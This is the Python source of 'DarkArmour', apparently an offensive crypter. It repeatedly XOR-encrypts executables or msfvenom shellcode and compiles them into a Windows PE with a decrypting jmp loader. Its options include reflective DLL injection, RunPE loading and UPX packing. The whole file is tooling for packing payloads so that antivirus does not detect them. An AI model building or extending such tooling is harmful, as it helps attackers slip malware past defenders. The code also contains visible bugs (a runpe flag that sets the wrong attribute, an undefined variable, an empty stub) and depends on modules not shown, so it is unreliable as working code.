#!/usr/bin/env python3

import os
import sys
import random
import string
import argparse

from lib import banner
from lib import compile
from lib import auxiliary
from lib import encryption

class DarkArmour(object):
    def __init__(self):
        super(DarkArmour, self).__init__()
        self.version = 0.3
        self.enc_algos = ["xor"]
        self.compile_binary = compile.Binary()

    def show_banner(self):
        banner.show_banner(self.version)
        return

    def _do_encrypt(self):
        print(f"[i] Begining encryption via {self.crypt_type.upper()}")
        keys_used = {}
        for loop in range(self.loops):
            sys.stdout.write(f"[i] Generating and encrypting with key ({loop})                              \r")
            if self.crypt_type == "xor":
                crypt = encryption.XOR()
            if loop == 0:
                bytes, len, key = crypt.crypt_file(True, crypt.key, infile=self.in_file)
            else:
                bytes, len, key = crypt.crypt_file(True, crypt.key, infile=None, data=bytes, data_length=len)
            keys_used[str(loop)] = key
            if loop != self.loops - 1:
                bytes = auxiliary.clean_hex_output(bytes)
        return bytes, len, keys_used


    def _do_jmp(self):
        bytes, length, keys_used = self._do_encrypt()

        keys = []
        for i in keys_used: keys.append(hex(int(i)))
        sys.stdout.write(f"[+] Encrypted with keys ({', '.join(keys)})                              \n")

        print(f"[i] Preparing and writing {length} bytes to pe image")
        pe_image = auxiliary.prepare_pe_image(length, bytes)
        auxiliary.write_pe_image(pe_image)

        print(f"[i] Writing header file")
        auxiliary.write_header_file(keys_used, jmp=True)

        print(f"[i] Creating decryption routine with recursion depth {self.loops}")
        file_clean = auxiliary.write_decrypt("src/jmp_loader/main.c", self.loops)

        sys.stdout.write(f"[i] Compiling into PE {self.out_file}...\r")
        self.compile_binary.compile("src/jmp_loader/main.c", self.out_file)
        auxiliary.clean_up("src/jmp_loader/main.c", file_clean)
        print(f"[+] Wrote {auxiliary.get_size(self.out_file)} bytes to {self.out_file}")


    def _do_runpe(self):
        pass

    def _parse_args(self, args):
        if args['outfile'] is None:
            self.out_file = auxiliary.gen_rand_filename() + ".exe"
            print(f"[i] No out filename supplied, contents shall be stored in: {self.out_file}")
        else: self.out_file = args['outfile']
        if args['upx'] is not False: self.upx = True
        else: self.upx = False
        if args['jmp'] is not False: self.jmp = True
        else: self.jmp = False
        if args['runpe'] is not False: self.jmp = True
        else: self.runpe = False
        if args['shellcode'] is not False: self.shellcode = args['shellcode']
        if args['file'] is not False: self.in_file = args['file']
        self.crypt_type = args['encrypt']
        self.key = args['key']
        self.loops = int(args['loop'])

    def _do_crypt(self, clean=False):
        print(f"[i] Started armouring {self.in_file} ({auxiliary.get_size(self.in_file)} bytes)")
        if clean: file_to_clean = infile
        if self.jmp:
            print(f"[i] Configuring to use JMP loader")
            self._do_jmp()
        if self.runpe:
            self._do_runpe()

    def run(self, args):
        self._parse_args(args)
        self._do_crypt()

if __name__ == '__main__':
    darkarmour = DarkArmour()
    darkarmour.show_banner()
    ap = argparse.ArgumentParser()

    ap.add_argument("-f", "--file", required=False, help="file to crypt, assumed as binary if not told otherwise")
    ap.add_argument("-e", "--encrypt", required=True, help=f"encryption algorithm to use ({', '.join(darkarmour.enc_algos)})")
    ap.add_argument("-S", "--shellcode", required=False, help="file contating the shellcode, needs to be in the 'msfvenom -f raw' style format")
    ap.add_argument("-b", "--binary", required=False, action='store_true', help="provide if file is a binary exe")
    ap.add_argument("-d", "--dll", required=False, action='store_true', help="use reflective dll injection to execute the binary inside another process")
    ap.add_argument("-u", "--upx", required=False, action='store_true', help="pack the executable with upx")
    ap.add_argument("-j", "--jmp", required=False, action='store_true', help="use jmp based pe loader")
    ap.add_argument("-r", "--runpe", required=False, action='store_true', help="use runpe to load pe")
    ap.add_argument("-s", "--source", required=False, action='store_true', help="provide if the file is c source code")
    ap.add_argument("-k", "--key", required=False, help="key to encrypt with, randomly generated if not supplied")
    ap.add_argument("-l", "--loop", required=False, default=1, help="number of levels of encryption")
    ap.add_argument("-o", "--outfile", required=False, help="name of outfile, if not provided then random filename is assigned")

    darkarmour.run(vars(ap.parse_args()))
